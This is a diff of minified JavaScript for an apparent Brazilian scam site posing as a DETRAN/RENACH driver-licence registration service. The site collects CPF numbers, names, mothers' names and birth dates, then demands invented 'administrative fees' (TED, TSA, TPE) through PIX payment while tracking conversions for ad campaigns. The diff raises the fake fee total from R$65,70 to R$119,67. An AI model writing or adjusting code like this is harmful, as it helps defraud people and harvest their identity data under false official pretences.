@@ -12930,7 +12930,7 @@ function d3() {
         nome: w.DADOS.nome,
         dataNascimento: w.DADOS.data_nascimento || "",data_nascimento: w.DADOS.data_nascimento || "",
         nomeMae: w.DADOS.nome_mae || ""
-      })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"SHOPIFY LOJA 03",currency:"BRL",value:65.70});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : (localStorage.setItem("userData", JSON.stringify({ cpf: h, nome: "", dataNascimento: "", nomeMae: "" })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"SHOPIFY LOJA 03",currency:"BRL",value:65.70});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`))
+      })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"SHOPIFY LOJA 03",currency:"BRL",value:119.67});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : (localStorage.setItem("userData", JSON.stringify({ cpf: h, nome: "", dataNascimento: "", nomeMae: "" })), (function(){try{if(typeof window.fbq==="function"){window.fbq("track","Lead",{content_name:"SHOPIFY LOJA 03",currency:"BRL",value:119.67});}}catch(e){}})(), a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`))
     } catch (h) {
       console.error("Error fetching data:", h);
       const w = {
@@ -14896,13 +14896,13 @@ function gp() {
     if (m) try { const A = JSON.parse(m); b = A.email || ""; C = A.phone || "" } catch (A) { console.error("Error parsing userData:", A) }
     if (typeof window.fbq < "u") try {
       window.fbq("track", "Purchase", {
-        value: 65.70,
+        value: 119.67,
         currency: "BRL",
         content_name: "SHOPIFY LOJA 03",
         content_type: "product"
       }), console.log("Facebook Pixel: Purchase tracked")
     } catch (A) { console.error("Facebook Pixel error:", A) }
-    try { const _utmPurchase = () => { try { window.utmify("track", "Purchase", { value: 65.70, currency: "BRL" }), console.log("Utmify: Purchase tracked") } catch (e) { console.error("Utmify error:", e) } }; if (window.utmify) { _utmPurchase() } else { let _attempts = 0; const _interval = setInterval(() => { _attempts++; if (window.utmify) { clearInterval(_interval); _utmPurchase() } else if (_attempts >= 20) { clearInterval(_interval); console.warn("Utmify: not loaded") } }, 500) } } catch (A) { console.error("Utmify setup error:", A) }
+    try { const _utmPurchase = () => { try { window.utmify("track", "Purchase", { value: 119.67, currency: "BRL" }), console.log("Utmify: Purchase tracked") } catch (e) { console.error("Utmify error:", e) } }; if (window.utmify) { _utmPurchase() } else { let _attempts = 0; const _interval = setInterval(() => { _attempts++; if (window.utmify) { clearInterval(_interval); _utmPurchase() } else if (_attempts >= 20) { clearInterval(_interval); console.warn("Utmify: not loaded") } }, 500) } } catch (A) { console.error("Utmify setup error:", A) }
     localStorage.setItem(p, new Date().toISOString())
   }, []), x.useEffect(() => {
     if (v.current) return;
@@ -14929,7 +14929,7 @@ function gp() {
           body: JSON.stringify({
             nome: C.nome,
             cpf: C.cpf,
-            valor: 65.70,
+            valor: 119.67,
             email: C.email || "",
             telefone: C.phone || "",
             detran: j
@@ -21139,7 +21139,7 @@ function kE() {
       return isNaN(y.getTime()) ? h : y.toLocaleDateString("pt-BR")
     },
     f = h => {
-      localStorage.setItem("selectedDetran", JSON.stringify(h));(function(){try{if(typeof window.fbq==="function"){window.fbq("track","InitiateCheckout",{content_name:"SHOPIFY LOJA 03",currency:"BRL",value:65.70,num_items:1});}}catch(e){}})(); e("/chat")
+      localStorage.setItem("selectedDetran", JSON.stringify(h));(function(){try{if(typeof window.fbq==="function"){window.fbq("track","InitiateCheckout",{content_name:"SHOPIFY LOJA 03",currency:"BRL",value:119.67,num_items:1});}}catch(e){}})(); e("/chat")
     };
   return l.jsxs("div", {
     children: [l.jsx(rt, {}), l.jsx("div", {
@@ -21401,7 +21401,7 @@ function DE() {
           console.log("PAGAMENTO CONFIRMADO!");
           const I = `fb_conversion_${M}`;
           return !localStorage.getItem(I) && typeof window.fbq < "u" && (window.fbq("track", "Purchase", {
-            value: (t == null ? void 0 : t.amount) || 65.70,
+            value: (t == null ? void 0 : t.amount) || 119.67,
             currency: "BRL",
             content_name: "SHOPIFY LOJA 03",
             content_type: "product",
@@ -21439,7 +21439,7 @@ function DE() {
             "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            amount: 65.70,
+            amount: 119.67,
             customer_name: _.nome,
             customer_email: _.email,
             customer_phone: _.phone,
@@ -22089,7 +22089,7 @@ function OE() {
           if (console.log("PAGAMENTO CONFIRMADO!", Y.bank_tx_id), typeof window < "u" && window.fbq) {
             const ge = window.fbq;
             ge("track", "Purchase", {
-              value: (m == null ? void 0 : m.amount) || 65.70,
+              value: (m == null ? void 0 : m.amount) || 119.67,
               currency: "BRL",
               content_type: "product",
               content_ids: [B],
@@ -22114,7 +22114,7 @@ function OE() {
           if (console.log("PAGAMENTO CONFIRMADO (manual)!", W.bank_tx_id), typeof window < "u" && window.fbq) {
             const Y = window.fbq;
             Y("track", "Purchase", {
-              value: (m == null ? void 0 : m.amount) || 65.70,
+              value: (m == null ? void 0 : m.amount) || 119.67,
               currency: "BRL",
               content_type: "product",
               content_ids: [m.deposit_id],
@@ -22209,7 +22209,7 @@ function OE() {
     const Y = "fb_addtocart_chat_tracked";
     if (!localStorage.getItem(Y) && typeof window.fbq < "u") try {
       window.fbq("track", "AddToCart", {
-        value: 65.70,
+        value: 119.67,
         currency: "BRL",
         content_name: "SHOPIFY LOJA 03",
         content_type: "product"
@@ -22246,7 +22246,7 @@ function OE() {
             "Content-Type": "application/json"
           },
           body: JSON.stringify({
-            amount: 65.70,
+            amount: 119.67,
             customer_name: ge.nome,
             customer_email: ge.email || "cliente@email.com",
             customer_phone: ge.phone || "11999999999",
@@ -22301,11 +22301,11 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
     }, xw = async () => {
       tc("Prosseguir", !1), i("renach_created"), await vw(`Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:
 
-• Taxa de Expedição de Documento (TED): R$ 17,00
-• Taxa de Serviços Administrativos (TSA): R$ 21,50
-• Taxa de Processamento Eletrônico (TPE): R$ 27,20
+• Taxa de Expedição de Documento (TED): R$ 30,96
+• Taxa de Serviços Administrativos (TSA): R$ 39,16
+• Taxa de Processamento Eletrônico (TPE): R$ 49,55
 
-Valor Total: R$ 65,70`, 3e3), i("finalize_button")
+Valor Total: R$ 119,67`, 3e3), i("finalize_button")
     }, ww = async () => {
       tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
       const B = setTimeout(() => {
@@ -22950,7 +22950,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 68,10, clique no botão 
                       children: "TAXA DE EXPEDIÇÃO DE DOCUMENTO (TED)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "17,00"
+                      children: "30,96"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-1 border-b border-gray-200",
@@ -22959,7 +22959,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 68,10, clique no botão 
                       children: "TAXA DE SERVIÇOS ADMINISTRATIVOS (TSA)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "21,50"
+                      children: "39,16"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-1 border-b border-gray-200",
@@ -22968,14 +22968,14 @@ Assim que realizar o pagamento das taxas no valor de R$ 68,10, clique no botão 
                       children: "TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)"
                     }), l.jsx("span", {
                       className: "font-semibold",
-                      children: "27,20"
+                      children: "49,55"
                     })]
                   }), l.jsxs("div", {
                     className: "flex justify-between py-2 bg-gray-100 px-2 font-bold",
                     children: [l.jsx("span", {
                       children: "TOTAL"
                     }), l.jsx("span", {
-                      children: "65,70"
+                      children: "119,67"
                     })]
                   })]
                 })]
@@ -23275,7 +23275,7 @@ function VE() {
         if (typeof window < "u" && window.fbq) {
           const P = window.fbq;
           P("track", "Purchase", {
-            value: parseFloat((r == null ? void 0 : r.amount) || "65.70"),
+            value: parseFloat((r == null ? void 0 : r.amount) || "119.67"),
             currency: "BRL",
             content_type: "product",
             content_ids: [C],
